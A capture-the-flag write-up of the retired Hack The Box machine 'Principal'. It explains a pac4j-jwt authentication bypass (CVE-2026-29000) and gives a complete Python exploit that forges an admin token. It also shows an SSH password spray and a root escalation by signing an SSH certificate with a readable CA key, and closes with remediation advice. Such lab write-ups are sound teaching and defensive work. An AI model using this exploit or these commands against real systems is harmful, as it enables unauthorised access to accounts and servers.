# Principal - HTB Write-up

> **Scope note:** This write-up documents an authorised Hack The Box lab. The
> machine is retired, which is why the write-up is public.

## Summary

Principal is a medium Linux box built around one idea repeated at two layers:
the system verifies that a cryptographic wrapper is valid, but never checks the
identity claim inside it.

The foothold is CVE-2026-29000, an authentication bypass in pac4j-jwt 6.0.3.
The server decrypts a JWE and then only verifies the inner signature if one
exists, so an unsigned inner token skips verification entirely. That gives
admin access to an internal platform, which leaks a password in a settings API
response. The password is reused for a Linux service account. That account can
read an SSH certificate authority private key, and sshd trusts that CA without
restricting which principals it will accept, so a certificate can be signed for
root.

```text
Public RSA key from /api/auth/jwks
  -> unsigned JWT inside a valid JWE (CVE-2026-29000)
  -> admin on the Principal Internal Platform
  -> password leaked in /api/settings
  -> password reuse / SSH as svc-deploy
  -> readable SSH CA private key
  -> certificate signed with principal=root
  -> root
```

Both halves are the same class of bug. Worth noticing that before reading on,
because it made the second half much easier to spot once I had seen the first.

## Enumeration

```bash
export TARGET=10.129.244.220
```

```bash
nmap -sC -sV -Pn "$TARGET"
```

Two ports:

```text
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
|     X-Powered-By: pac4j-jwt/6.0.3
```

The `X-Powered-By` header is the whole box in one line. It names the auth
library and its exact version, and pac4j-jwt 6.0.3 is vulnerable to
CVE-2026-29000.

I also kicked off a full port scan in the background, which found nothing else:

```bash
nmap -p- --min-rate 5000 -Pn "$TARGET"
```

## Web application reconnaissance

Port 8080 redirects to `/login`. I tried `admin`/`admin` on the form, which
returned "Authentication required". That tells you nothing: a login form that
returns the same error for a bad username and a bad password is behaving
correctly, and is deliberately not usable for enumerating accounts.

Rather than fuzz for directories immediately, I read what the app hands out for
free. `/static/js/app.js` is linked from the page source and its header comment
documents the entire authentication design:

```javascript
/**
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
```

That is every endpoint, every claim name, and the exact JWE algorithms, without
a single request to a wordlist. Reading the client-side source before fuzzing
turned out to be the single highest-value thing I did on this box.

Further down, the navigation function shows which endpoints are admin-only:

```javascript
{ label: 'Users',    endpoint: USERS_ENDPOINT,    roles: [ROLES.ADMIN] },
{ label: 'Settings', endpoint: SETTINGS_ENDPOINT, roles: [ROLES.ADMIN] },
```

Fetch the public key:

```bash
curl -s http://$TARGET:8080/api/auth/jwks | jq
```

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX<SNIP>"
    }
  ]
}
```

Only the encryption key is published. The signing key is separate and not
exposed, which is normal and correct. Publishing an RSA public key used for
encryption is not itself a vulnerability: it lets anyone send the server
something only the server can read, and nothing more.

That is exactly what the CVE breaks.

## Understanding the vulnerability

I want to write this part out properly because it is the bit I had to work
hardest to understand, and the flags I used are forgettable while the idea is
not.

A JWT is a set of claims (`sub`, `role` and so on) that the server issues after
a successful login and then trusts on every later request. Because the server
holds no session state, it does not re-check the user store: it just reads the
claims and believes them. That is what stateless authentication means.

Two protections normally stop me writing my own claims:

- **Signature (JWS)** proves the server issued it. I cannot forge this without
  the private signing key.
- **Encryption (JWE)** stops anyone reading the token in transit. It is locked
  with the public RSA key, and only the server's private key opens it.

In `JwtAuthenticator`, the server decrypts the JWE, extracts the inner payload,
and calls Nimbus's `toSignedJWT()` on it. Then:

```java
signedJWT = encryptedJWT.getPayload().toSignedJWT();
if (signedJWT != null) {
    jwt = signedJWT;
}
// ...
if (signedJWT != null) {                 // <-- the bug
    for (SignatureConfiguration config : signatureConfigurations) {
        verify = config.verify(signedJWT);
    }
}
createJwtProfile(ctx, credentials, jwt); // runs regardless
```

`toSignedJWT()` returns `null` when the payload is not a JWS. A **PlainJWT**,
an unsigned token with `{"alg":"none"}`, is valid per the JWT spec and produces
exactly that null.

So the condition reads "if there is a signature, verify it". If there is no
signature at all, the whole verification block is skipped and
`createJwtProfile` still runs on the unverified claims.

The attack is therefore not "forge a valid signature". It is "send no signature
and the check never runs". The public key is enough, because the public key is
all that is needed to build the envelope.

## Foothold - forging an admin token

The public PoCs for this CVE are Java, and they are self-contained: they
generate a keypair, configure a local authenticator, and attack themselves in
process. That proves the bug exists but is useless against a real target.

Translating it is the actual work, and it comes down to four facts extracted
from the Java:

| Java | What it means |
|---|---|
| `.subject("admin")` | a claim named `sub` |
| `new PlainJWT(claims)` | unsigned, `alg: none` |
| `JWEAlgorithm.RSA_OAEP_256` | how the envelope is locked |
| `EncryptionMethod.A256GCM` | how the contents are encrypted |

Note the last one. The CVE write-up uses `A256GCM`, but `app.js` on this target
documents `A128GCM`. **The CVE tells you the class of flaw; the target tells
you its own details.** I used the target's value and it worked first time.

The claim names likewise come from `app.js`, not the PoC. The generic pac4j
example uses `$int_roles` as a list; this application wants a single `role`
string.

`forge.py`:

```python
#!/usr/bin/env python3
"""CVE-2026-29000 - pac4j-jwt authentication bypass."""

import base64, json, sys, time
import requests
from jwcrypto import jwe, jwk

TARGET = sys.argv[1].rstrip("/")

CLAIMS = {
    "sub":  "admin",
    "role": "ROLE_ADMIN",
    "iss":  "principal-platform",
    "iat":  int(time.time()),
    "exp":  int(time.time()) + 18000,
}

def b64url(raw: bytes) -> str:
    # JWTs use base64url with the '=' padding stripped.
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

# 1. the server's public key
jwks = requests.get(f"{TARGET}/api/auth/jwks", timeout=10).json()
key_data = jwks["keys"][0]
public_key = jwk.JWK(**key_data)

# 2. an unsigned JWT. the trailing dot is the empty signature, and is the
#    entire exploit
header  = b64url(json.dumps({"alg": "none"}).encode())
payload = b64url(json.dumps(CLAIMS).encode())
plain_jwt = f"{header}.{payload}."

# 3. wrap it in a JWE with the public key. cty=JWT tells the server the
#    payload is itself a token
token = jwe.JWE(
    plain_jwt.encode(),
    recipient=public_key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "kid": key_data["kid"],
        "cty": "JWT",
    }),
).serialize(compact=True)

# 4. use it
headers = {"Authorization": f"Bearer {token}"}
resp = requests.get(f"{TARGET}/api/dashboard", headers=headers, timeout=10)
print(f"[*] GET /api/dashboard -> HTTP {resp.status_code}")
if resp.status_code == 200:
    user = resp.json().get("user", {})
    print(f"[+] Authenticated as {user.get('username')} ({user.get('role')})")
print(f"\n[*] Token:\n{token}")
```

```bash
pip install jwcrypto requests
python3 forge.py http://$TARGET:8080
```

```text
[*] GET /api/dashboard -> HTTP 200
[+] Authenticated as admin (ROLE_ADMIN)
```

No login, no password, no stolen token. The token was minted from a public key.

To use it in the browser instead: devtools, Storage, Session Storage, add a key
`auth_token` with the token as its value, then load `/dashboard`. That is what
`TokenManager.getToken()` reads.

## Post-authentication enumeration

```bash
export TOKEN='<forged token>'
curl -s -H "Authorization: Bearer $TOKEN" http://$TARGET:8080/api/users | jq
```

Eight accounts. The interesting one does not have a role from the schema in
`app.js`:

```json
{
  "username": "svc-deploy",
  "displayName": "Deploy Service",
  "department": "DevOps",
  "role": "deployer",
  "note": "Service account for automated deployments via SSH certificate auth."
}
```

A service account whose stated purpose is SSH, on a box with port 22 open.

```bash
curl -s -H "Authorization: Bearer $TOKEN" http://$TARGET:8080/api/settings | jq
```

```json
{
  "security": {
    "authFramework": "pac4j-jwt",
    "authFrameworkVersion": "6.0.3",
    "jwtAlgorithm": "RS256",
    "jweAlgorithm": "RSA-OAEP-256",
    "jweEncryption": "A128GCM",
    "encryptionKey": "D3pl0y_$$H_Now42!",
    "tokenExpiry": "3600s",
    "sessionManagement": "stateless"
  },
  "infrastructure": {
    "sshCertAuth": "enabled",
    "sshCaPath": "/opt/principal/ssh/",
    "notes": "SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."
  }
}
```

Two things matter here and I nearly walked past both.

Everything in `security` describes *how* the system works except one entry,
which is a *value*. `encryptionKey` is labelled as a key but is shaped like a
password a human typed: leetspeak, mixed case, symbols, trailing exclamation
mark. **Labels lie. Look at the shape of the value, not its name.**

In `infrastructure`, "CA" is the word that matters. A certificate authority
signs things, and signing means vouching for identity. A CA that sshd actively
trusts, with its key on disk so automation can use it unattended, is a
high-value target by definition.

## Lateral movement - password spray

Eight usernames, one password, one SSH service. That is a password spray: one
password across many accounts, rather than many passwords against one, which
avoids lockouts.

```bash
printf '%s\n' admin svc-deploy jthompson amorales bwright kkumar mwilson lzhang > users.txt
nxc ssh $TARGET -u users.txt -p 'D3pl0y_$$H_Now42!'
```

```text
SSH  10.129.244.220  22  [-] admin:D3pl0y_$$H_Now42!
SSH  10.129.244.220  22  [+] svc-deploy:D3pl0y_$$H_Now42!  Linux - Shell access!
```

```bash
ssh svc-deploy@$TARGET
cat ~/user.txt
```

```text
<ad8f8091cb2a09e6a387affd30f5c350>
```

## Privilege escalation - SSH CA certificate forgery

```bash
id
```

```text
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

`sudo -l` reports no sudo rights. The `deployers` group is the lead, and it
matches the path from `/api/settings`:

```bash
ls -la /opt/principal/ssh/
```

```text
drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub
```

`ca` is the CA private key and it is group-readable by `deployers`.

```bash
cat README.txt
```

```text
CA keypair for SSH certificate automation.
This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.
```

Check whether the key is passphrase-protected. The reliable way is to ask the
tool rather than squint at base64:

```bash
ssh-keygen -y -f /opt/principal/ssh/ca
```

It prints the public key with no prompt, so the key is unencrypted. (If you do
want to see why: the OpenSSH private key format stores a cipher name and a KDF
name right after the `openssh-key-v1` magic. Both read `none` here. A protected
key would show something like `aes256-ctr` and `bcrypt`. You cannot spot this by
eye in the base64, because base64 packs three bytes into four characters so the
same word encodes differently depending on its offset.)

Now the sshd configuration:

```bash
cat /etc/ssh/sshd_config.d/60-principal.conf
```

```text
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

The vulnerability here is a line that is **not** present.

`TrustedUserCAKeys` makes sshd accept any certificate signed by that CA. There
is no `AuthorizedPrincipalsFile` and no `AuthorizedPrincipalsCommand`, which are
the directives an administrator uses to say which principals each account will
accept. Without them, sshd falls back to its default rule: a certificate is
valid for a username if that username appears in the certificate's principals
list. I hold the signing key, so I decide what goes in that list.

`PermitRootLogin prohibit-password` blocks password login for root but
explicitly permits key and certificate authentication.

This is the same flaw as the foothold, one layer down. The certificate is
genuinely signed by a trusted CA, so the cryptographic wrapper verifies. Nobody
checks the identity claim inside it.

A certificate is not a credential, it is a statement the CA vouches for. So the
sequence is: generate a fresh keypair of my own, have the CA sign its public
half, and specify the principal.

```bash
cd /tmp
ssh-keygen -t ed25519 -f /tmp/pwn -N "" -q
ssh-keygen -s /opt/principal/ssh/ca -I pwn-root -n root -V +1h /tmp/pwn.pub
```

Flags: `-s` the CA key doing the signing, `-I` a label that appears in logs,
`-n` the principal, `-V` the validity window. `-n root` is the entire attack.

Verify before using it:

```bash
ssh-keygen -L -f /tmp/pwn-cert.pub
```

```text
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Signing CA: RSA SHA256:<SNIP> (using rsa-sha2-512)
        Key ID: "pwn-root"
        Valid: from <TIME> to <TIME>
        Principals:
                root
```

```bash
ssh -i /tmp/pwn root@localhost
id
cat /root/root.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
<e18f63f8c6f5cdb5b131e2dcb31d822e>
```

## Mistakes and dead ends

Keeping these in because they cost me the most time and are the part I actually
need to remember.

**`$$` expanded in double quotes.** My first spray sent
`D3pl0y_1045499H_Now42!` instead of the real password, because bash substitutes
`$$` with the current process ID inside double quotes. Every account failed.
Single quotes fixed it. Any password containing `$`, `!`, backticks or
backslashes needs single quotes.

**`ssh_config` vs `sshd_config`.** I spent several minutes in
`/etc/ssh/ssh_config.d/`, which was empty, before noticing the `d`. The first is
the client configuration, how this box behaves when it connects out. The second
is the daemon, how it behaves when others connect in. I wanted the daemon.

**Heredoc terminator on the same line.** I wrote
`cat > users.txt <<'EOF' admin svc-deploy ... EOF` on one line and bash hung
waiting for input. The terminator has to be alone on its own line. `printf
'%s\n' a b c > file` avoids the whole problem.

**Looked for the wrong thing in the JWKS response.** I initially assumed the
published key was itself a finding. It is not. Publishing an encryption public
key is normal and safe. The finding is the library that fails to verify what
comes back.

**Nearly skipped the settings response.** I read `/api/settings`, decided most
of it was version numbers, and moved on. Both the password and the CA path were
in it. Recon output is not read once and discarded: when a new capability
arrives, go back and ask what it unlocks that you have already seen.

## Lessons learned

- Stateless JWT authentication means the user store is consulted once, at
  login, and never again. Every request after that rests entirely on the
  signature check. Breaking that check does not bypass a login form, it
  bypasses the concept of accounts.
- A null check in front of a verification block is a bug pattern worth
  recognising. "If a signature exists, verify it" fails open when no signature
  exists. The spec allowing unsigned tokens is what makes it reachable.
- Read the application's own client-side source before fuzzing. It gave me
  every endpoint, the claim schema and the exact algorithms.
- A public exploit proves a vulnerability exists. It does not fit your target.
  Translating it, and preferring the target's documented values over the
  write-up's, is the actual work.
- Secrets in an admin-gated API response are protected by exactly one control.
  When that control failed, there was no second layer.
- Credential reuse across trust boundaries turns an application disclosure into
  operating system access. These are two separate findings, and either one alone
  would not have been enough.
- Read configuration for what is missing, not only for what is present.
  Everything in `60-principal.conf` was correct. The vulnerability was an absent
  directive.
- `TrustedUserCAKeys` without `AuthorizedPrincipalsFile` means anyone holding
  the CA private key can authenticate as any user, including root.

## Remediation

- Upgrade pac4j-jwt to 6.3.3 or later (5.7.9 for 5.x, 4.5.9 for 4.x). The
  patched code rejects a decrypted payload that is not a signed JWT rather than
  skipping verification.
- Do not return secrets from configuration endpoints. Serialise an explicit
  allow-list of fields rather than the whole configuration object.
- Do not reuse an application secret as an operating system account password.
- Set `AuthorizedPrincipalsFile` (or `AuthorizedPrincipalsCommand`) for every
  account that accepts certificate authentication, so a certificate is only
  valid for the principals an administrator has approved.
- Restrict read access to the CA private key. If automation needs to sign
  certificates, put the signing behind a service that validates the requested
  principal, rather than granting read access to the key itself.
- Consider `PermitRootLogin no` and require escalation through a named account.
